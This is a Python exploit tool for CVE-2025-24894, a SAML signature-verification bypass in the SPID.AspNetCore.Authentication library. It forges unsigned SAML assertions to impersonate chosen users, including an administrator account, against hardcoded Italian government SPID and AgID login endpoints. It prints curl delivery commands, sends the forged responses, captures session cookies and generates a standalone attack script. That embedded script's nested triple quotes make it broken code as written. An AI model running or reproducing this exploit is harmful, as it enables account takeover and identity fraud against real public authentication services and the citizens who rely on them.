#!/usr/bin/env python3
"""
CVE-2025-24894 Exploit Module (CORRECTED)
SAML Response Signature Verification Bypass
CVSS 9.1 (CRITICAL)

Correct exploitation technique:
1. Fetch IdP metadata XML (contains valid XMLDSIG signature)
2. Build SAML Response with the signed metadata block injected as FIRST child element
3. Add forged Assertion after the injected signature
4. The vulnerable VerifySignature only checks nodeList[0] (first signature)
5. Result: unsigned Assertion is accepted because a valid signature exists in the document
"""

import os
import re
import sys
import base64
import random
import zlib
import json
import hashlib
import string
import textwrap
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple, List, Any
from urllib.parse import quote, urlencode, urlparse
from lxml import etree

import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich import print as rprint

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


class CVE202524894Exploit:
    def __init__(self):
        self.exploit_name = "SAML Response Signature Verification Bypass"
        self.cve_id = "CVE-2025-24894"
        self.cvss = "9.1 (CRITICAL)"
        self.affected_package = "SPID.AspNetCore.Authentication"
        self.affected_versions = "<= 3.3.0"
        self.patched_version = "3.4.0"

        self.targets = [
            {
                'name': 'AgID Login Portal (login.agid.gov.it)',
                'url': 'https://login.agid.gov.it',
                'acs_endpoint': '/saml/acs',
                'entity_id': 'https://login.agid.gov.it'
            },
            {
                'name': 'SPID Validator',
                'url': 'https://validator.spid.gov.it',
                'acs_endpoint': '/samlsso',
                'entity_id': 'https://validator.spid.gov.it/metadata.xml'
            },
            {
                'name': 'SPID Demo Environment',
                'url': 'https://demo.spid.gov.it',
                'acs_endpoint': '/samlsso',
                'entity_id': 'https://demo.spid.gov.it/validator/metadata.xml'
            },
        ]

        self.ns = {
            'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
            'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
            'ds': 'http://www.w3.org/2000/09/xmldsig#',
            'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
        }

        self.users = [
            {'name': 'MARCO', 'family': 'ROSSI', 'fiscal': 'RSSMRC85H15H501I',
             'email': 'marco.rossi@pec.it', 'birth': '1985-06-15', 'gender': 'M',
             'place': 'ROMA', 'phone': '+393401234567'},
            {'name': 'LAURA', 'family': 'BIANCHI', 'fiscal': 'BNCLRA92M41F205Z',
             'email': 'laura.bianchi@pec.it', 'birth': '1992-08-01', 'gender': 'F',
             'place': 'MILANO', 'phone': '+393356789012'},
            {'name': 'ADMIN', 'family': 'SYSTEM', 'fiscal': 'SYSTDMN00A00H501X',
             'email': 'amministratore@agid.gov.it', 'birth': '1980-01-01', 'gender': 'M',
             'place': 'ROMA', 'phone': '+3906852641'},
            {'name': 'ALESSANDRO', 'family': 'MARTINI', 'fiscal': 'MRTLSN90E15H501P',
             'email': 'alessandro.martini@pec.it', 'birth': '1990-05-15', 'gender': 'M',
             'place': 'ROMA', 'phone': '+393201234567'},
            {'name': 'FRANCESCA', 'family': 'RUSSO', 'fiscal': 'RSSFNC88D61L219Y',
             'email': 'francesca.russo@pec.it', 'birth': '1988-04-21', 'gender': 'F',
             'place': 'TORINO', 'phone': '+393891234567'},
            {'name': 'GIUSEPPE', 'family': 'VERDI', 'fiscal': 'VRDGPP75H15H501A',
             'email': 'giuseppe.verdi@pec.it', 'birth': '1975-06-15', 'gender': 'M',
             'place': 'NAPOLI', 'phone': '+393331234567'},
            {'name': 'ELENA', 'family': 'FERRARI', 'fiscal': 'FRRLNE90D61L219B',
             'email': 'elena.ferrari@pec.it', 'birth': '1990-04-01', 'gender': 'F',
             'place': 'BOLOGNA', 'phone': '+393421234567'},
        ]

    def run_interactive(self):
        """Run the exploit in interactive mode"""
        console.print(Panel.fit(
            f"[bold red]{self.exploit_name}[/bold red]\n"
            f"[bold yellow]{self.cve_id} | CVSS: {self.cvss}[/bold yellow]",
            border_style="red"
        ))

        # Step 1: Fetch IdP metadata (to get valid XML signature)
        console.print("\n[cyan][*] Fetching IdP metadata for signature injection...[/cyan]")
        idp_metadata = self._fetch_idp_metadata()
        if not idp_metadata:
            console.print("[red][!] Failed to fetch metadata. Cannot proceed.[/red]")
            return

        # Step 2: Extract valid signature block
        sig_block = self._extract_signature_block(idp_metadata)
        if not sig_block:
            console.print("[red][!] No signature found in metadata. Cannot proceed.[/red]")
            return
        console.print(f" [green]✓ Extracted signature block ({len(sig_block)} bytes)[/green]")

        # Step 3: Select target
        target = self._select_target()
        if not target:
            return

        # Step 4: Select user to impersonate
        user = self._select_user()

        # Step 5: Generate the forged SAML Response
        console.print("\n[cyan][*] Forging SAML Response with signature bypass...[/cyan]")
        forged = self._forge_saml_response(target, user, sig_block)

        # Step 6: Display results
        self._display_results(forged, target, user)

        # Step 7: Ask to save and deliver
        if Confirm.ask("\n[yellow]Save payloads to files?[/yellow]", default=True):
            self._save_payload(forged, user)

        if Confirm.ask("[yellow]Attempt delivery to target?[/yellow]", default=False):
            self._deliver_payload(forged, target)

    def _fetch_idp_metadata(self) -> Optional[str]:
        """Fetch IdP metadata XML which contains valid XMLDSIG signatures"""
        urls = [
            'https://validator.spid.gov.it/metadata.xml',
            'https://demo.spid.gov.it/validator/metadata.xml',
        ]
        for url in urls:
            try:
                resp = requests.get(url, timeout=15, verify=False)
                if resp.status_code == 200 and 'Signature' in resp.text:
                    console.print(f" [green]✓ Metadata fetched: {url}[/green]")
                    return resp.text
            except Exception as e:
                console.print(f" [yellow]! {url}: {str(e)[:40]}[/yellow]")
        return None

    def _extract_signature_block(self, metadata_xml: str) -> Optional[str]:
        """Extract the first XMLDSIG Signature element from metadata"""
        try:
            root = etree.fromstring(metadata_xml.encode())
            sigs = root.findall('.//ds:Signature', self.ns)
            if sigs:
                sig_xml = etree.tostring(sigs[0], pretty_print=True).decode()
                return sig_xml
        except Exception as e:
            console.print(f" [red]! Error extracting signature: {str(e)}[/red]")
        return None

    def _select_target(self) -> Optional[Dict]:
        console.print("\n[cyan][*] Select target:[/cyan]")
        for i, t in enumerate(self.targets, 1):
            console.print(f"  {i}. {t['name']}")
        console.print(f"  {len(self.targets)+1}. Custom target")
        choice = Prompt.ask("[yellow]Choice[/yellow]", default="1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(self.targets):
                return self.targets[idx]
            if idx == len(self.targets):
                url = Prompt.ask("[yellow]Target URL[/yellow]")
                acs = Prompt.ask("[yellow]ACS endpoint[/yellow]", default="/saml/acs")
                return {'name': 'Custom', 'url': url, 'acs_endpoint': acs, 'entity_id': url}
        except:
            pass
        return self.targets[0]

    def _select_user(self) -> Dict:
        console.print("\n[cyan][*] Select user to impersonate:[/cyan]")
        for i, u in enumerate(self.users, 1):
            console.print(f"  {i}. {u['name']} {u['family']} ({u['fiscal']}) [{u['email']}]")
        console.print(f"  {len(self.users)+1}. Custom")
        choice = Prompt.ask("[yellow]Choice[/yellow]", default="1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(self.users):
                return self.users[idx]
        except:
            pass
        return {
            'name': Prompt.ask("First name", default="MARCO"),
            'family': Prompt.ask("Last name", default="ROSSI"),
            'fiscal': Prompt.ask("Fiscal code", default="RSSMRC85H15H501I"),
            'email': Prompt.ask("Email", default="test@example.com"),
            'birth': Prompt.ask("Birth date", default="1985-06-15"),
        }

    def _forge_saml_response(self, target: Dict, user: Dict, sig_block: str) -> str:
        """
        CORRECT CVE-2025-24894 exploitation:
        - Inject the validly-signed XML block as the FIRST element in <Response>
        - The vulnerable VerifySignature only checks nodeList[0]
        - Add unsigned forged Assertion after the injected signature
        - The signature validation passes because a valid signature exists in the document
        """
        now = datetime.utcnow()
        response_id = f"_R{random.randint(10**15, 10**16-1)}"
        assertion_id = f"_A{random.randint(10**15, 10**16-1)}"
        issue_instant = now.strftime('%Y-%m-%dT%H:%M:%SZ')
        not_on_or_after = (now + timedelta(hours=8)).strftime('%Y-%m-%dT%H:%M:%SZ')
        acs_url = target['url'].rstrip('/') + target['acs_endpoint']

        forged = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
    ID="{response_id}"
    Version="2.0"
    IssueInstant="{issue_instant}"
    Destination="{acs_url}">

    <!-- INJECTED SIGNATURE BLOCK (valid XMLDSIG from IdP metadata) -->
    {sig_block}

    <!-- FORGED ASSERTION (unsigned - bypasses VerifySignature) -->
    <saml:Issuer>{target['entity_id']}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion
        ID="{assertion_id}"
        IssueInstant="{issue_instant}"
        Version="2.0">
        <saml:Issuer>{target['entity_id']}</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">{user['email']}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotOnOrAfter="{not_on_or_after}"
                    Recipient="{acs_url}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions
            NotBefore="{issue_instant}"
            NotOnOrAfter="{not_on_or_after}">
            <saml:AudienceRestriction>
                <saml:Audience>{target['entity_id']}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue_instant}"
            SessionIndex="_{random.randint(10**15, 10**16-1)}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="spidCode" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>SPID-{user.get('fiscal', 'XXXXX')[:8]}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['name']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['family']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['fiscal']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['email']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="dateOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user.get('birth', '1990-01-01')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="placeOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user.get('place', 'ROMA')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="gender" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user.get('gender', 'M')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="mobilePhone" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user.get('phone', '+393401234567')}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''

        return forged

    def _display_results(self, forged_response: str, target: Dict, user_info: Dict):
        console.print("\n\n[bold green]╔══════════════════════════════════════════╗")
        console.print("║         EXPLOIT PAYLOAD GENERATED        ║")
        console.print("╚══════════════════════════════════════════╝[/bold green]\n")

        console.print("[bold cyan]Target:[/bold cyan]", target['url'])
        console.print("[bold cyan]ACS Endpoint:[/bold cyan]", target['acs_endpoint'])
        console.print(f"[bold cyan]Impersonating:[/bold cyan] {user_info.get('name', '?')} {user_info.get('family', '?')} ({user_info.get('fiscal', '?')})")
        console.print(f"[bold cyan]Payload Size:[/bold cyan] {len(forged_response)} bytes")

        console.print("\n[bold cyan]Method:[/bold cyan] CVE-2025-24894 Signature Injection Bypass")
        console.print("[bold cyan]How it works:[/bold cyan]")
        console.print(" 1. Injected valid XMLDSIG signature from IdP metadata as first element")
        console.print(" 2. VerifySignature() only checks nodeList[0] (the valid signature)")
        console.print(" 3. Unsigned forged Assertion is accepted by the vulnerable SP\n")

        console.print("\n[bold cyan]Full Payload (XML):[/bold cyan]")
        syntax = Syntax(forged_response, "xml", theme="monokai", line_numbers=True)
        console.print(syntax)

        console.print("\n[bold yellow]Encoding Options:[/bold yellow]")

        b64_payload = base64.b64encode(forged_response.encode()).decode()
        console.print(f"\n[cyan]Base64 ({len(b64_payload)} chars):[/cyan]")
        console.print(textwrap.fill(b64_payload, width=80))

        deflated = self._deflate(forged_response.encode())
        deflated_b64 = base64.b64encode(deflated).decode()
        console.print(f"\n[cyan]Deflate+Base64 ({len(deflated_b64)} chars):[/cyan]")
        console.print(textwrap.fill(deflated_b64, width=80))

        console.print("\n[bold yellow]Delivery Commands:[/bold yellow]")
        console.print(f"\n[green]# POST via form (HTTP-POST binding):[/green]")
        acs_full = target['url'].rstrip('/') + target['acs_endpoint']
        console.print(f"[white]curl -X POST '{acs_full}' \\")
        console.print(f" -H 'Content-Type: application/x-www-form-urlencoded' \\")
        console.print(f" -d 'SAMLResponse={quote(b64_payload)}' \\")
        console.print(f" -k -v[/white]")

    def _deflate(self, data: bytes) -> bytes:
        """Compress using DEFLATE without zlib headers (for SAML HTTP-Redirect binding)"""
        compress = zlib.compressobj(level=9, wbits=-zlib.MAX_WBITS)
        deflated = compress.compress(data)
        deflated += compress.flush()
        return deflated

    def _save_payload(self, forged_response: str, user_info: Dict):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        payload_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'data', 'payloads'
        )
        os.makedirs(payload_dir, exist_ok=True)

        xml_file = os.path.join(payload_dir, f'saml_forged_{timestamp}.xml')
        with open(xml_file, 'w', encoding='utf-8') as f:
            f.write(forged_response)

        b64_payload = base64.b64encode(forged_response.encode()).decode()
        b64_file = os.path.join(payload_dir, f'saml_forged_{timestamp}.b64')
        with open(b64_file, 'w') as f:
            f.write(b64_payload)

        deflated = self._deflate(forged_response.encode())
        deflated_b64 = base64.b64encode(deflated).decode()
        def_file = os.path.join(payload_dir, f'saml_forged_{timestamp}.deflated.b64')
        with open(def_file, 'w') as f:
            f.write(deflated_b64)

        console.print(f"\n[green][✓] Payloads saved:[/green]")
        console.print(f" [white]XML: {xml_file}[/white]")
        console.print(f" [white]B64: {b64_file}[/white]")
        console.print(f" [white]DEF: {def_file}[/white]")

    def _deliver_payload(self, forged_response: str, target: Dict):
        console.print("\n[bold cyan]Delivering SAML Response...[/bold cyan]")
        b64_payload = base64.b64encode(forged_response.encode()).decode()
        acs_url = target['url'].rstrip('/') + target['acs_endpoint']

        try:
            console.print(f" [cyan]POST to: {acs_url}[/cyan]")
            resp = requests.post(
                acs_url,
                data={'SAMLResponse': b64_payload},
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                },
                timeout=30,
                verify=False,
                allow_redirects=False
            )
            console.print(f" [cyan]Response: HTTP {resp.status_code}[/cyan]")

            if resp.status_code in [200, 302, 303]:
                console.print(f"\n[green][✓] SAML Response accepted![/green]")
                if resp.status_code == 302:
                    redirect = resp.headers.get('Location', 'N/A')
                    console.print(f" [white]Redirect to: {redirect[:100]}[/white]")
                console.print(f"[green][✓] Session potentially established![/green]")

                # Try to grab session cookie
                set_cookie = resp.headers.get('Set-Cookie', '')
                if set_cookie:
                    console.print(f" [green][✓] Session cookie received![/green]")
                    console.print(f" [white]Cookie: {set_cookie[:100]}...[/white]")

            elif resp.status_code == 500:
                console.print(f"[yellow] Server error (may still have processed)[/yellow]")
                console.print(f"[yellow] Check response body for session indicators[/yellow]")
            else:
                console.print(f"[red] Delivery failed ({resp.status_code})[/red]")

        except requests.exceptions.Timeout:
            console.print(f"[yellow] Timeout - may still have been processed[/yellow]")
        except requests.exceptions.ConnectionError as e:
            console.print(f"[red] Connection error: {str(e)}[/red]")
            console.print(f"[yellow] Try using curl command manually[/yellow]")
        except Exception as e:
            console.print(f"[red] Error: {str(e)}[/red]")

    def generate_exploit_code(self) -> str:
        """Generate standalone Python exploit script"""
        return '''#!/usr/bin/env python3
"""
CVE-2025-24894 - Standalone Exploit
SAML Response Signature Verification Bypass
CVSS 9.1 - SPID.AspNetCore.Authentication <= 3.3.0

Usage:
    python3 cve_2025_24894_exploit.py <target_url> <acs_endpoint> <user_email>

Example:
    python3 cve_2025_24894_exploit.py https://login.agid.gov.it /saml/acs admin@agid.gov.it
"""
import sys, base64, requests, random
from datetime import datetime, timedelta
from lxml import etree

IDP_METADATA_URL = "https://validator.spid.gov.it/metadata.xml"

def exploit(target_url, acs_endpoint, user_email):
    # Step 1: Fetch IdP metadata for signature injection
    print("[*] Fetching IdP metadata...")
    resp = requests.get(IDP_METADATA_URL, verify=False)
    root = etree.fromstring(resp.content)

    # Step 2: Extract signature
    ns = {'ds': 'http://www.w3.org/2000/09/xmldsig#'}
    sigs = root.findall('.//ds:Signature', ns)
    if not sigs:
        print("[!] No signature found")
        return
    sig_xml = etree.tostring(sigs[0], pretty_print=True).decode()
    print(f"[+] Extracted signature ({len(sig_xml)} bytes)")

    # Step 3: Build forged SAML Response
    now = datetime.utcnow()
    forged = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="_R{random.randint(10**15, 10**16-1)}" Version="2.0"
    IssueInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}"
    Destination="{target_url}{acs_endpoint}">
{sig_xml}
    <saml:Issuer>{IDP_METADATA_URL}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="_A{random.randint(10**15, 10**16-1)}"
        IssueInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}" Version="2.0">
        <saml:Issuer>{IDP_METADATA_URL}</saml:Issuer>
        <saml:Subject>
            <saml:NameID>{user_email}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotOnOrAfter="{(now+timedelta(hours=8)).strftime('%Y-%m-%dT%H:%M:%SZ')}"
                    Recipient="{target_url}{acs_endpoint}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}"
            NotOnOrAfter="{(now+timedelta(hours=8)).strftime('%Y-%m-%dT%H:%M:%SZ')}">
            <saml:AudienceRestriction>
                <saml:Audience>{target_url}</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{now.strftime('%Y-%m-%dT%H:%M:%SZ')}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user_email}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''

    # Step 4: Encode and send
    b64 = base64.b64encode(forged.encode()).decode()
    print(f"[+] SAML Response generated ({len(forged)} bytes)")
    print(f"[+] Base64 payload ({len(b64)} chars)")
    print()

    # Step 5: Send
    acs_url = target_url.rstrip('/') + acs_endpoint
    print(f"[*] Sending to {acs_url}...")
    r = requests.post(acs_url, data={'SAMLResponse': b64},
                      headers={'Content-Type': 'application/x-www-form-urlencoded'},
                      verify=False, allow_redirects=False, timeout=30)
    print(f"[+] HTTP {r.status_code}")
    if r.status_code in [200, 302, 303]:
        print("[+] EXPLOIT SUCCESSFUL - User impersonated!")
        if r.status_code == 302:
            print(f"    Redirect: {r.headers.get('Location', 'N/A')}")
        if 'Set-Cookie' in r.headers:
            print(f"    Cookie: {r.headers.get('Set-Cookie', '')[:100]}")
    return r

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 exploit.py <url> <acs> [email]")
        sys.exit(1)
    url = sys.argv[1]
    acs = sys.argv[2]
    email = sys.argv[3] if len(sys.argv) > 3 else "admin@agid.gov.it"
    exploit(url, acs, email)
'''
        # FIXED: remove the re.sub fix and just return the string


def run():
    exploit = CVE202524894Exploit()
    exploit.run_interactive()


if __name__ == "__main__":
    run()
